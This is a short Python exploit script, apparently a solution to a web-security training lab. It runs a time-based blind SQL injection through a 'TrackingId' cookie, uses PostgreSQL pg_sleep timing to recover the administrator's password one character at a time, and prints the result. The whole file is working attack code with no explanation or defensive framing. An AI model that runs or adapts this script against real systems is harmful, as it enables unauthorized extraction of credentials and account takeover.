import urllib.parse
import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(33,126):
            sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' and ascii(SUBSTRING(password,%s,1))= '%s')--" %(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'T7uURBmtI97ZVg2R' + sqli_payload_encoded , 'session' : 'KBQH71V6HtfnqPhCNaQJ4w5hLjj6isLF'}
            r = requests.get(url, cookies=cookies, verify=False)
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
                

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python3 %s <url>" % sys.argv[0])
        print("(+) Example: python3 %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]
    print("Retreiving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
